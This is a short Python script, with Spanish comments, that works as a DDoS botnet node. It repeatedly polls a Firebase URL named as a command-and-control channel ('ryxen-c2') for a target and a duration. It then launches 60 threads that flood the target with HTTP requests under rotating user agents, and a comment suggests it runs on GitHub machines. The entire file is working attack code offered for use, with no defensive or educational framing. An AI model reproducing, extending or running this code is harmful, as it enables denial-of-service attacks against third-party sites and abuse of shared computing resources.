import requests
import time
import threading
import random

# CONFIGURACIÓN - URL de tu base de datos
DB_URL = "https://ryxen-c2-default-rtdb.firebaseio.com/attack.json"

def get_headers():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15"
    ]
    return {'User-Agent': random.choice(user_agents), 'Accept': '*/*'}

def storm_engine(method, target, end_time):
    while time.time() < end_time:
        try:
            # TLS Handshake Spam / HTTP Flood
            requests.get(target, headers=get_headers(), timeout=2)
        except:
            pass

def listen_command():
    last_stamp = ""
    print("[SYSTEM] Ryxen Node Online. Listening to Firebase...")
    while True:
        try:
            r = requests.get(DB_URL).json()
            if r and r.get('stamp') != last_stamp:
                last_stamp = r['stamp']
                target = r['target'] if r['target'].startswith("http") else f"http://{r['target']}"
                duration = int(r['time'])
                end_time = time.time() + duration
                
                print(f"[!] Executing {r['method']} on {target} for {duration}s")
                
                # Lanzar 60 hilos por cada máquina de GitHub
                for _ in range(60):
                    threading.Thread(target=storm_engine, args=(r['method'], target, end_time), daemon=True).start()
        except:
            pass
        time.sleep(2)

if __name__ == "__main__":
    listen_command()
          
